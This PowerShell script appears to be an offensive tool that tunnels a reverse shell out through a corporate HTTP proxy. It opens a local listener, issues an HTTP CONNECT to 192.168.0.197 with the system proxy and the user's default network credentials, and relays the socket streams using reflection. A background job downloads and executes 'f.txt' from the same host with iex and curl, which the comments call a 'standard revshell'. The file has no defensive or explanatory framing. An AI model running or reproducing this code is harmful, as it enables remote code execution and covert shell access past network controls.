$bindIP = "127.0.0.1"
$bindPort = 5555
$destHost = "192.168.0.197"
$destPort = 5555
$clientBuffer = new-object System.Byte[] 1024
$request = [System.Net.HttpWebRequest]::Create("http://" + $destHost + ":" + $destPort ) 
$request.Method = "CONNECT"

# Detect and set automatic proxy and network credentials
$proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$request.Proxy = $proxy

$listener = new-object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Parse($bindIP), $bindPort)

# is standard revshell that points to localhost
Start-Job { powershell  -c "Start-sleep -s 5; iex (curl http://192.168.0.197/f.txt).content"}

#-------------------------------------------------------------------------
# This script block is executed in a separate PowerShell object, as another
# thread. It reads data from the serverStream and writes it to the clientStream
# as long as there's data
$Script = {
	param($state)
	$serverBuffer = new-object System.Byte[] 1024
	
	$count = 0
	do {
		$count = $state.serverStream.Read($serverBuffer, 0 ,$serverBuffer.length)
		$state.clientStream.Write($serverBuffer, 0 , $count)
		$state.clientStream.Flush()
	} while ($count -gt 0)
}

#-------------------------------------------------------------------------
# Starting the TCP listener
$listener.start()

write-host "Waiting for a connection on port $bindPort..."
$client = $listener.AcceptTcpClient()
write-host "Connected from $($client.Client.RemoteEndPoint)"

#----------------------------------------------------------------------------------------------------
# Get the client side stream object to read/write to
$clientStream = $client.GetStream() # This is a System.Net.Sockets.NetworkStream

#----------------------------------------------------------------------------------------------------
# Get the server side response and corresponding stream object to read/write to
$serverResponse = $request.GetResponse()
$responseStream = $serverResponse.GetResponseStream()

#----------------------------------------------------------------------------------------------------
# Reflection inspection to retrieve and reuse the underlying networkStream instance
$BindingFlags= [Reflection.BindingFlags] "NonPublic,Instance"
$rsType = $responseStream.GetType()
$connectionProperty = $rsType.GetProperty("Connection", $BindingFlags)
$connection = $connectionProperty.GetValue($responseStream, $null)
$connectionType = $connection.GetType()
$networkStreamProperty = $connectionType.GetProperty("NetworkStream", $BindingFlags)
$serverStream = $networkStreamProperty.GetValue($connection, $null)

# This state object is used to pass various object by reference to the child PowerShell object (thread)
# that is created afterwards
$state = [PSCustomObject]@{"serverStream"=$serverStream;"clientStream"=$clientStream}

# Create a child PowerShell object to run the background Socket receive method.
$PS = [PowerShell]::Create()
$PS.AddScript($Script).AddArgument($state) | Out-Null
[System.IAsyncResult]$AsyncJobResult = $null

try
{
	# The receive job is started asynchronously.
	$AsyncJobResult = $PS.BeginInvoke()
	do {
		$bytesReceived = $clientStream.Read($clientBuffer, 0, $clientBuffer.length)
		$serverStream.Write($clientBuffer, 0 , $bytesReceived)
		#$text = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesReceived)
		#Write-Host $text
		
	} while ($client.Connected -or $clientStream.DataAvailable)
}
catch {
	$ErrorMessage = $_.Exception.Message
	Write-Host $ErrorMessage
}
finally {
	# Cleanup the client socket and child PowerShell process.
    if ($client -ne $null) {
        $client.Close()
        $client.Dispose()
        $client = $null
    }
	
	if ($listener -ne $null) {
		$listener.Stop()
	}

	write-host "Connection closed."

    if ($PS -ne $null -and $AsyncJobResult -ne $null) {
        $PS.EndInvoke($AsyncJobResult)
        $PS.Dispose()
    }
}
